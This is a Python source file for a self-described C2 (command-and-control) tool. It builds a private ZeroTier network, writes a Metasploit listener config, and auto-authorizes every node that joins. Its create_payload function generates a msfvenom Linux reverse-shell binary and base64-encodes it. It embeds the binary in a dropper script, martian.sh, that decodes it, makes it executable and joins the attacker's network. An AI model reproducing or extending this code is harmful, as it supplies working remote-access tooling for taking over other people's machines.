import subprocess
import requests
import json
import os
import threading
import base64
import time
from logger import logger
from termcolor import colored

# Create zero-tier network using local network manager (or remote, doesn't really matter)

# Join and authenticate self

#token = subprocess.check_output('sudo cat /var/lib/zerotier-one/authtoken.secret', shell=True, text=True).strip()
#local_id = subprocess.check_output('sudo zerotier-cli info | cut -d " " -f 3', shell=True, text=True).strip()
#network_id = ''
#local_ip = ''

def create_new_network(log):
    global local_ip, network_id, token, local_id

    # Collects information about local zerotier instance
    os.environ['TOKEN'] = subprocess.check_output('sudo cat /var/lib/zerotier-one/authtoken.secret', shell=True, text=True).strip()
    os.environ['NODEID'] = subprocess.check_output('sudo bin/zerotier-cli info | cut -d " " -f 3', shell=True, text=True).strip()

    #print('DEBUG:')
    #print(f'token: {token}')
    #print(f'local_id: {local_id}')

    # Create new network using local server
    headers = {
        'X-ZT1-AUTH': os.getenv('TOKEN', ''),
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = '{}'
    response = requests.post(
        'http://localhost:9993/controller/network/' + os.getenv('NODEID', '') + '______',
        headers=headers,
        data=data,
    )

    print('DEBUG:')
    #print(f'URL: {url}')
    print(f'data: {data}')
    print(f'response: {response}, {response.text}')

    d = json.loads(response.text)
    
    # This is what any node joining the network needs to have
    os.environ['NWID'] = d.get('id')

    # TODO actually see if it succeeded
    log.print_success(f'Network created with network ID {os.environ["NWID"]}')

    # Join network
    subprocess.run(f'sudo bin/zerotier-cli join {os.environ["NWID"]}', shell=True, text=True)

    # TODO validate success
    log.print_general(f'Attempted to join locally to network {os.environ["NWID"]}')


    # Create routes and IP range for new network
    print('Creating new zero-tier network using local network manager...')

    print('Enter the private IP range of the new network: (ex. 10.0.0.1/24)')
    ip_range = input()

    print('Enter starting private IP: (ex. 10.0.0.1)')
    ip_start = input()

    print('Enter ending private IP: (ex. 10.0.0.254)')
    ip_end = input()

    args = [ip_range, ip_start, ip_end]

    ## Continue with python to curl changes with OS environment variables

    headers = {
    'X-ZT1-AUTH': os.getenv('TOKEN', ''),
    'Content-Type': 'application/x-www-form-urlencoded',
    }

    payload = {
        "ipAssignmentPools": [{"ipRangeStart": ip_start, "ipRangeEnd": ip_end}],
        "routes": [{"target": ip_range, "via": None}],
        "v4AssignMode": "zt",
        "private": True
    }

    response = requests.post('http://localhost:9993/controller/network/' + os.getenv('NWID', ''), headers=headers, json=payload)
    #log.print_success(f'Set arguments {args} for network {network_id}')x

    print('DEBUG:')
    print(f'response: {response}, {response.text}')

    # Authenticate self to network

    # New

    headers = {
    'X-ZT1-AUTH': os.getenv('TOKEN', ''),
    'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = '{"authorized": true}'

    response = requests.post(
        'http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member/' + os.getenv('NODEID', ''),
        headers=headers,
        data=data
    )

    print('DEBUG:')
    print(f'response: {response}, {response.text}')

    # Old

    # url = f'http://localhost:9993/controller/network/{network_id}/member/{local_id}'
    # payload = {
    #     'authorized': True
    # }
    # response = requests.post(url, headers=headers, json=payload)
    # log.print_general(response.text)



    local_ip = input('Enter local IP (ifconfig, ip a, etc.):\t')

    # Create metasploit config payload

    with open('prod/msf-settings.rc', 'w') as f:
        f.write('workspace GALAXY\n')
        f.write('use exploit/multi/handler\n')
        f.write(f'set LHOST {local_ip}\n')
        f.write('set LPORT 1337\n')
        f.write('exploit\n')
    log.print_general('Metasploit configuration written to prod/msf-settings.rc')    


def create_payload():
    global local_ip, network_id

    command = f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={local_ip} LPORT=1337 -f elf'
    print(f'COMMAND IS: {command}')
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
    encoded = base64.b64encode(output.stdout)
    #print(encoded)
    #print(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={local_ip} LPORT=1337 -f elf > rev.elf && chmod +x rev.elf')

    shell_text = 'echo "' + encoded.decode() + '" | base64 -d > rev.elf && chmod +x rev.elf'
    #print(shell_text)

    # Add MSFVenom payload to base script
    script = open('scripts/martian_template.sh').readlines()
    script.insert(1, shell_text + '\n')
    script.insert(7, f'sudo ./zerotier-cli join {network_id}\n')

    with open('prod/martian.sh', 'w') as f:
        for line in script:
            f.write(line)

# Gets called by wait_to_authenticate()
def authenticate_new_members():
    global network_id, local_id, token

    #token = subprocess.check_output('sudo cat /var/lib/zerotier-one/authtoken.secret', shell=True, text=True).strip()
    #local_id = subprocess.check_output('sudo zerotier-cli info | cut -d " " -f 3', shell=True, text=True).strip()

    authorized_nodes = [local_id]
    
    url = f'http://localhost:9993/controller/network/{network_id}/member'
    
    headers = {
        "X-ZT1-AUTH": token,
        "Content-Type": "application/json"
    }

    while True:

        response = requests.get(url, headers=headers)
        #print(response.text)
        nodes = json.loads(response.text)
        for key in nodes:
            if(not key in authorized_nodes):
                print(f'Key is: {key}')
                auth_url = f'http://localhost:9993/controller/network/{network_id}/member/{key}'

                payload = {
                    'authorized': True
                }

                response = requests.post(url=auth_url, headers=headers, json=payload)
                print(f'authorized new node {key}')
                authorized_nodes.append(key)
            time.sleep(5)

def wait_to_authenticate():
    thr = threading.Thread(target=authenticate_new_members)
    thr.start()
    print('[*] Attempting to authenticate new members...')
    return

def menu(log):
    # 24 characters
    print('\n------------------------')
    print('New Network:\n')
    print(colored('\t1 >', 'blue') + ' Create new C2 network')
    print('\n------------------------')
    print('Current Network:\n')
    print(colored('\t2 >', 'blue') + ' Generate payload')
    print(colored('\t3 >', 'blue') + ' Authorize all nodes')
    print('\n------------------------')
    print('Network Maintenance:\n')
    print(colored('\t4 >', 'blue') + ' Purge local networks (zerotier client)')
    print(colored('\t5 >', 'blue') + ' Purge server networks (network controller)')

    choice = ''
    while(not choice in ['1', '2', '3', '4', '5']):
        print('\nEnter selection > ', end='')
        choice = input()
    print()
    log.print_general(f'User select option {str(choice)}')


if __name__ == '__main__':
    
    log = logger()
    menu(log)

    # Createst new zerotier network for connection
    create_new_network(log)
    
    # Starts new thread to try and authenticate new nodes
    #wait_to_authenticate()

    # Creates shell script to run (using default linux msfvenom payload)
    #create_payload()

    